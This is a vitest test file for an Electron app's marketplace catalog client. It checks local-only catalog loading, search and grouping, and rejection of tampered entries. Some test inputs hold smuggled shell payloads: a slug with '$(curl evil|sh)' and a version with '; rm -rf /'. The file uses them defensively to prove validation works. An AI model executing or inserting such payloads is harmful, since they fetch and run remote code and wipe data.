// electron/tests/marketplace/client.test.ts
//
// 2026-11-02 网络获取下线后：fetchCatalog 纯本地直读（原「远程优先 + 本地回退
// + SWR/退避」机制与其测试整体退役——远端获取只保留 momo-hub）。
// 保留面：searchItems / groupByCategory 纯函数 + validateCatalog S1 注入防线直测。
// 设置 AP_USER_DATA_DIR 到临时目录，避免 logger 写入真实用户目录。

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  fetchCatalog,
  readBundledCatalog,
  validateCatalog,
  searchItems,
  groupByCategory,
} from '../../src/main/marketplace/client';

// 本地内置 catalog 条目数动态派生（防目录增删后计数锁漂移——2026-10-20 全量首跑实证）
const LOCAL_CATALOG_PATH = path.resolve(__dirname, '../../..', 'resources/marketplace/catalog.json');
const LOCAL_ITEM_COUNT = (JSON.parse(fs.readFileSync(LOCAL_CATALOG_PATH, 'utf-8')) as { items: unknown[] }).items.length;
import type { Catalog } from '../../src/main/marketplace/types';

const tmpRoot = path.join(os.tmpdir(), `ap-mp-client-test-${Date.now()}`);

let fetchSpy: ReturnType<typeof vi.spyOn>;

beforeEach(() => {
  fs.mkdirSync(tmpRoot, { recursive: true });
  process.env.AP_USER_DATA_DIR = tmpRoot;
  fetchSpy = vi.spyOn(globalThis, 'fetch') as unknown as typeof fetchSpy;
});

afterEach(() => {
  fetchSpy.mockRestore();
  vi.restoreAllMocks();
  fs.rmSync(tmpRoot, { recursive: true, force: true });
  delete process.env.AP_USER_DATA_DIR;
});

describe('marketplace/client fetchCatalog（本地直读）', () => {
  it('返回打包内置 catalog（version/条数与 catalog.json 一致）', async () => {
    const catalog = await fetchCatalog();
    expect(catalog.version).toBe('1.0');
    expect(catalog.items).toHaveLength(LOCAL_ITEM_COUNT);
  });

  it('零网络回归锁：全程不发任何 fetch（网络获取下线核心语义）', async () => {
    fetchSpy.mockImplementation(() => {
      throw new Error('fetchCatalog 不应触发网络请求');
    });
    const catalog = await fetchCatalog();
    expect(catalog.version).toBe('1.0');
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('与 readBundledCatalog 同源（镜像自愈等确定性本地清单消费方共用同一份）', async () => {
    const a = await fetchCatalog();
    const b = readBundledCatalog();
    expect(a).toEqual(b);
  });
});

describe('marketplace/client searchItems', () => {
  const catalog: Catalog = {
    version: '1.0',
    updatedAt: '2026-01-01',
    items: [
      {
        id: '1',
        type: 'agent',
        slug: 'coder',
        name: '程序员',
        version: '1.0.0',
        author: 'a',
        description: '写代码',
        readme: '',
        tags: ['coding', 'dev'],
        category: 'dev',
        iconEmoji: '💻',
        verificationStatus: 'official',
        downloadUrl: '',
        checksum: '',
        sizeBytes: 0,
        installCount: 0,
      },
      {
        id: '2',
        type: 'mcp',
        slug: 'fs',
        name: 'Filesystem',
        version: '1.0.0',
        author: 'b',
        description: '文件系统',
        readme: '',
        tags: ['filesystem'],
        category: 'dev',
        iconEmoji: '📁',
        verificationStatus: 'verified',
        downloadUrl: '',
        checksum: '',
        sizeBytes: 0,
        installCount: 0,
      },
    ],
  };

  it('空 query 返回全部（可叠加类型过滤）', () => {
    expect(searchItems(catalog, '')).toHaveLength(2);
    expect(searchItems(catalog, '', 'mcp')).toHaveLength(1);
    expect(searchItems(catalog, '', 'mcp')[0]!.id).toBe('2');
  });

  it('按 name 匹配（大小写无关）', () => {
    const res = searchItems(catalog, 'FILE');
    expect(res).toHaveLength(1);
    expect(res[0]!.slug).toBe('fs');
  });

  it('按 description 匹配', () => {
    const res = searchItems(catalog, '代码');
    expect(res).toHaveLength(1);
    expect(res[0]!.slug).toBe('coder');
  });

  it('按 tag 匹配', () => {
    const res = searchItems(catalog, 'coding');
    expect(res).toHaveLength(1);
    expect(res[0]!.slug).toBe('coder');
  });

  it('按 slug 匹配', () => {
    const res = searchItems(catalog, 'coder');
    expect(res).toHaveLength(1);
  });

  it('组合 query + type 过滤', () => {
    expect(searchItems(catalog, 'filesystem', 'agent')).toHaveLength(0);
    expect(searchItems(catalog, 'filesystem', 'mcp')).toHaveLength(1);
  });
});

describe('marketplace/client groupByCategory', () => {
  it('按 category 正确分组', () => {
    const catalog: Catalog = {
      version: '1.0',
      updatedAt: '2026-01-01',
      items: [
        {
          id: '1', type: 'agent', slug: 'a1', name: 'A1', version: '1.0.0', author: '',
          description: '', readme: '', tags: [], category: 'dev', iconEmoji: '🤖',
          verificationStatus: 'official', downloadUrl: '', checksum: '', sizeBytes: 0, installCount: 0,
        },
        {
          id: '2', type: 'agent', slug: 'a2', name: 'A2', version: '1.0.0', author: '',
          description: '', readme: '', tags: [], category: 'writing', iconEmoji: '🤖',
          verificationStatus: 'official', downloadUrl: '', checksum: '', sizeBytes: 0, installCount: 0,
        },
        {
          id: '3', type: 'agent', slug: 'a3', name: 'A3', version: '1.0.0', author: '',
          description: '', readme: '', tags: [], category: 'dev', iconEmoji: '🤖',
          verificationStatus: 'official', downloadUrl: '', checksum: '', sizeBytes: 0, installCount: 0,
        },
      ],
    };

    const groups = groupByCategory(catalog.items);
    expect(groups.size).toBe(2);
    expect(groups.get('dev')).toHaveLength(2);
    expect(groups.get('writing')).toHaveLength(1);
  });

  it('空数组返回空 Map', () => {
    expect(groupByCategory([]).size).toBe(0);
  });
});

describe('marketplace/client validateCatalog 安全校验（S1）', () => {
  /** 构造单个 item 的最小 catalog，字段可覆盖（默认全部合法） */
  function makeCatalog(itemOverrides: Record<string, unknown>): Catalog {
    return {
      version: '9.9',
      updatedAt: '2026-01-01T00:00:00Z',
      items: [
        {
          id: 'x-1',
          type: 'agent',
          slug: 'x-agent',
          name: 'X Agent',
          version: '1.0.0',
          author: 'tester',
          description: 'a testing agent',
          readme: '# X',
          tags: ['test'],
          category: 'dev',
          iconEmoji: '🧪',
          verificationStatus: 'community',
          downloadUrl: '',
          checksum: '',
          sizeBytes: 1,
          installCount: 0,
          ...itemOverrides,
        },
      ],
    };
  }

  /** 任何一项不合法都视为整个 catalog 被篡改/损坏 → 直接抛错 */
  function expectRejected(catalog: unknown): void {
    expect(() => validateCatalog(catalog)).toThrow();
  }

  it('item.slug 含 shell 元字符 → 整体拒绝（抛错）', () => {
    expectRejected(makeCatalog({ slug: 'x"$(curl evil|sh)"' }));
  });

  it('item.version 含 shell 元字符 → 拒绝', () => {
    expectRejected(makeCatalog({ version: '1.0; rm -rf /' }));
  });

  it('item.type 非法枚举 → 拒绝', () => {
    expectRejected(makeCatalog({ type: 'evil' }));
  });

  it('downloadUrl 非 https → 拒绝', () => {
    expectRejected(makeCatalog({ downloadUrl: 'http://evil.test/pkg.tar.gz' }));
  });

  it('checksum 非 sha256 hex → 拒绝', () => {
    expectRejected(
      makeCatalog({ downloadUrl: 'https://ok.test/pkg.tar.gz', checksum: 'not-hex!' }),
    );
  });

  it('items 非数组 → 拒绝', () => {
    expectRejected({ version: '9.9', updatedAt: 'x', items: 'nope' });
  });

  it('顶层缺 version/updatedAt → 拒绝', () => {
    expectRejected({ items: [] });
  });

  it('合法 catalog（https downloadUrl + sha256 checksum）→ 正常通过', () => {
    const catalog = makeCatalog({
      downloadUrl: 'https://ok.test/pkg.tar.gz',
      checksum: 'a'.repeat(64),
    });
    const validated = validateCatalog(catalog);
    expect(validated.version).toBe('9.9');
    expect(validated.items).toHaveLength(1);
    expect(validated.items[0]!.slug).toBe('x-agent');
  });
});
